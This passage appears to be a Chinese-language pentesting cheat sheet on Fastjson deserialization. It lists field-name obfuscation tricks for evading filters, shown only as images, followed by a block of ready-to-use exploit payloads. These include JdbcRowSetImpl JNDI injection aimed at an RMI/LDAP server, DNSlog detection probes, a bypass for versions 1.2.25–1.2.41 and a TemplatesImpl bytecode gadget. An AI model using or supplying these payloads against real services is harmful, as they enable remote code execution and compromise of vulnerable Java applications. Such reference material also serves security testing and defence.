![image](images/attach-0e2fac387254ae74f91e12ba38a4b21685ccfab2.png)​

2. 使用`_`​混淆字段名

![image](images/attach-491cb71cd58a8ac2449beb604ad02492172f32e7.png)​

3. 使用`-`​和`_`​组合

![image](images/attach-24490f11bca60d6bc53bbc92390ebccb7410334f.png)​

4. 添加is来混淆属性

![image](images/attach-e2ab299193f77a9be5fff6773e63dd60530fbd6e.png)​

‍

Payload
-------

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap/rmi Server", "autoCommit":true}

{"zeo":{"@type":"java.net.Inet4Address","val":"dnslog"}}
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}
{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
Set[{"@type":"java.net.URL","val":"dnslog"}]
Set[{"@type":"java.net.URL","val":"dnslog"}
{{"@type":"java.net.URL","val":"dnslog"}:0

// 1.2.25-1.2.41
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/bm0qgp","autoCommit":"true"}}

//TemplatesImpl
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_outputProperties":{ },'_name':'a.b','_tfactory':{ },"_bytecodes":["base64"]}
```
